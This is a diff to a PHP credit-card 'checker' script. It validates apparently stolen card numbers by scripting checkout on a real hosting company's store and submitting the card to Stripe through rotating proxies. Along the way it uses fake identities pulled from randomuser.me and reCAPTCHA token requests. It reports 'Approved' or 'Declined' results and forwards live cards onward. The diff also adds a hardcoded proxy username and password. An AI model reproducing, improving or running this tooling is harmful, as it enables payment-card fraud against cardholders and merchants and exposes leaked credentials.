@@ -10,8 +10,7 @@ $userId = $_SESSION["user_id"];
 ##################### STRIPE RAW BY THEFLASHXD ###########################
 error_reporting(0);
 date_default_timezone_set('Asia/Jakarta');
-$abcd = rand(111,999);
-@unlink(''.$abcd.'cookie.txt');
+$abcd = "/cookie/".rand(111,999)."cookie.txt";
 if ($_SERVER['REQUEST_METHOD'] == "POST") {
     extract($_POST);
 } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
@@ -46,6 +45,7 @@ if (empty($proxies)) {
 
 // Pick one random proxy
 $proxydefault = $proxies[array_rand($proxies)];
+$proxyPWD = "197848:nDwY3AKkka";
 echo "#Proxy:「 $proxydefault 」\n";
 function value($str,$find_start,$find_end)
 {
@@ -73,6 +73,7 @@ if (strlen($ano) == 2) {
 ######################################################################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
@@ -82,18 +83,19 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 $curl = curl_exec($ch);
 curl_close($ch);
-$first = trim(strip_tags(getStr($curl,'"first":"','"')));
-$last = trim(strip_tags(getStr($curl,'"last":"','"')));
+$first = trim(strip_tags(getStr($curl,'"first":"','"'))) ?? 'flash';
+$last = trim(strip_tags(getStr($curl,'"last":"','"'))) ?? rand(11111,99999);
 $email = ''.$first.'.'.$last.'@gmail.com';
 ######################################################################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd&co=aHR0cHM6Ly9ob3N0aW5nLnJlYnNkZXNpZ25zLmNvbTo0NDM.&hl=en&v=GUGrl5YkSwpBsxsF3eY665Ye&size=invisible&cb=wosvnihspm4w');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
     'Pragma: no-cache',
@@ -118,12 +120,13 @@ curl_close($ch);
 #####################################################################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api2/reload?k=6LdBopUaAAAAAMNFTecuFkhyAq-ThETzVAEmJpLd');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
 curl_setopt($ch, CURLOPT_HTTPHEADER, [
     'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
     'Pragma: no-cache',
@@ -147,6 +150,7 @@ curl_close($ch);
 ####################################################################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/index.php?rp=/store/discord-bot-hosting/generic');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
@@ -157,8 +161,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
 $curl = curl_exec($ch);
 curl_close($ch);
 $csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
@@ -166,6 +170,7 @@ $csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
 #########################################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/cart.php');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -176,8 +181,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'ajax=1&a=confproduct&configure=true&i=0&billingcycle=monthly&configoption%5B5%5D=35');
 $curl = curl_exec($ch);
 curl_close($ch);
@@ -185,6 +190,7 @@ curl_close($ch);
 ########################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/cart.php?a=checkout&e=false');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
@@ -195,8 +201,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
 $curl = curl_exec($ch);
 curl_close($ch);
 $csf = trim(strip_tags(getStr($curl, "csrfToken = '", "'")));
@@ -205,6 +211,7 @@ $pi = trim(strip_tags(getStr($curl, "stripe = Stripe('", "'")));
 #########################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -215,8 +222,8 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=b71e6727-e215-4321-86fb-e144ff1cf5e4dc561f&muid=d1638923-e02b-4a44-abc0-c8e01fb894231f42ed&sid=2d7debf7-2894-48af-9372-4f9a207f57ed2ddb02&pasted_fields=number&payment_user_agent=stripe.js%2Fd16ff171ee%3B+stripe-js-v3%2Fd16ff171ee%3B+split-card-element&referrer=https%3A%2F%2Fhosting.rebsdesigns.com&time_on_page=85960&key='.$pi.'');
 $curl = curl_exec($ch);
 curl_close($ch);
@@ -224,12 +231,13 @@ $id = trim(strip_tags(getStr($curl, '"id": "', '"')));
 $ms = trim(strip_tags(getStr($curl, 'message": "', '"')));
 if (empty($id)) {
     echo '#Declined '.$ip.'「Declined : '.$ms.' : @luffy_dxD」';
-    @unlink(''.$abcd.'cookie.txt');
+    @unlink($abcd);
     die();
 }
 #########################################################
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $proxydefault);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyPWD);
 curl_setopt($ch, CURLOPT_URL, 'https://hosting.rebsdesigns.com/index.php?rp=/stripe/payment/intent');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_POST, 1);
@@ -240,13 +248,13 @@ curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'cookie.txt');
-curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'cookie.txt');
+curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/'.$abcd.'');
+curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/'.$abcd.'');
 curl_setopt($ch, CURLOPT_POSTFIELDS, 'token='.$csf.'&custtype=new&loginemail=&loginpassword=&firstname='.$first.'&lastname='.$last.'&email='.urlencode($email).'&country-calling-code-phonenumber=1&phonenumber=2042456&companyname=&address1=15+Cliff+Street&address2=&city=New+York&state=New+York&postcode=10038&country=US&password=oX%7D*OMs(lN!%7D&password2=oX%7D*OMs(lN!%7D&applycredit=1&paymentmethod=stripe&ccinfo=new&ccdescription=&notes=&marketingoptin=1&g-recaptcha-response='.$body.'&payment_method_id='.$id.'');
 $curl = curl_exec($ch);
 curl_close($ch);
 $error = trim(strip_tags(getStr($curl, 'validation_feedback":"', '"')));
-
+@unlink($abcd);
 if(strpos($curl, 'Your card has insufficient funds.')){
     echo '#Approved '.$ip.'「Insufficient Funds」 「Stripe Charge : @luffy_dxD」';
     forwardLives("Stripe",$error);
@@ -264,7 +272,7 @@ if(strpos($curl, 'Your card has insufficient funds.')){
     echo '#Declined '.$ip.'「Declined : '.$error.' : @luffy_dxD」';
     }
     
-    @unlink(''.$abcd.'cookie.txt');
+    @unlink(''.$abcd.'');
 
 
 
